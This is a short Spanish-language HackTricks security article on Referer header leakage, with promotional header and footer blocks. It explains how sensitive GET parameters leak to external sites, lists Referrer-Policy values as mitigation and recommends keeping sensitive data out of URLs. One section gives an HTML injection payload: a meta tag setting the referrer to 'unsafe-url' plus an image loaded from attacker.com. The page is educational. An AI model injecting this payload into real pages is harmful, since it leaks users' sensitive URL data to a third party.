{% hint style="success" %}
Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Entrenamiento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Entrenamiento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}


# Cabeceras de Referencia y política

Referer es la cabecera utilizada por los navegadores para indicar cuál fue la página previamente visitada.

## Información sensible filtrada

Si en algún momento dentro de una página web se encuentra información sensible en los parámetros de una solicitud GET, si la página contiene enlaces a fuentes externas o un atacante es capaz de hacer/sugerir (ingeniería social) que el usuario visite una URL controlada por el atacante. Podría ser capaz de extraer la información sensible dentro de la última solicitud GET.

## Mitigación

Puedes hacer que el navegador siga una **política de Referer** que podría **evitar** que la información sensible se envíe a otras aplicaciones web:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Contramedida

Puedes anular esta regla utilizando una etiqueta meta de HTML (el atacante necesita explotar una inyección de HTML):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Defensa

Nunca coloque datos sensibles dentro de los parámetros GET o en las rutas de la URL.


{% hint style="success" %}
Aprenda y practique Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Entrenamiento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda y practique Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Entrenamiento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoye a HackTricks</summary>

* Consulte los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únase al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síganos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparta trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
